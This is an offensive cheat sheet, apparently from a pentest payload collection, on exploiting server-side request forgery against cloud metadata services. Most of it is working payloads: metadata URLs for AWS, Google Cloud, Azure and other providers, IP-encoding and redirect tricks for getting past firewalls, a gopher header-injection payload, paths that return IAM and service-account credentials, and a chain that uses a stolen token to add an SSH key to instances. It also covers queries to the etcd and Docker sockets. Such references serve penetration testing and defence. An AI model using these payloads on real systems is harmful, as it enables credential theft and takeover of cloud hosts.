
# SSRF URL for Cloud Instances

> When exploiting Server-Side Request Forgery (SSRF) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). Below is a categorized list of common URLs for various cloud and infrastructure providers

## Summary 

* [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
* [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
* [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
* [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
* [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
* [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
* [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
* [SSRF URL for Azure](#ssrf-url-for-azure)
* [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
* [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
* [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
* [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
* [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
* [SSRF URL for Hetzner Cloud](#ssrf-url-for-hetzner-cloud)
* [SSRF URL for Docker](#ssrf-url-for-docker)
* [SSRF URL for Rancher](#ssrf-url-for-rancher)
* [References](#references)


## SSRF URL for AWS

The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)


* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`
  ```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/` 

In case of a WAF, you might want to try different ways to connect to the API.

* DNS record pointing to the AWS API IP
  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP redirect
  ```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* Encoding the IP to bypass WAF
  ```powershell
  http://425.510.425.510 Dotted decimal with overflow
  http://2852039166 Dotless decimal
  http://7147006462 Dotless decimal with overflow
  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
  http://0xA9FEA9FE Dotless hexadecimal
  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
  http://0251.0376.0251.0376 Dotted octal
  http://0251.00376.000251.0000376 Dotted octal with padding
  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] IPV6 Compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
  http://[fd00:ec2::254] IPV6
  ```


These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.

```powershell
http://169.254.169.254/latest/user-data
```

Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Examples**: 

* Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
* *Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`


## SSRF URL for AWS ECS

If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

This way you'll extract IAM keys of the attached role


## SSRF URL for AWS Elastic Beanstalk

We retrieve the `accountId` and `region` from the API.

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.


## SSRF URL for AWS Lambda

AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next

## SSRF URL for Google Cloud

:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google allows recursive pulls

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

Required headers can be set using a gopher SSRF with the following technique

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

Interesting files to pull out:

- SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
- Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

### Add an SSH key

Extract the token

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

Check the scope of the token

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

Now push the SSH key.

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## SSRF URL for Digital Ocean

Documentation available at `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

## SSRF URL for Packetcloud

Documentation available at `https://metadata.packet.net/userdata`

## SSRF URL for Azure

Limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

Update Apr 2017, Azure has more support; requires the header "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## SSRF URL for OpenStack/RackSpace

(header required? unknown)

```powershell
http://169.254.169.254/openstack
```

## SSRF URL for HP Helion

(header required? unknown)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## SSRF URL for Hetzner Cloud

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## SSRF URL for Kubernetes ETCD

Can contain API keys and internal ip and ports

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## SSRF URL for Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

More info:

- Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
- Docker Engine API: https://docs.docker.com/engine/api/latest/

## SSRF URL for Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/


## References

- [Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - December 13, 2017](https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
- [Exploiting SSRF in AWS Elastic Beanstalk - Sunil Yadav - February 1, 2019](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)
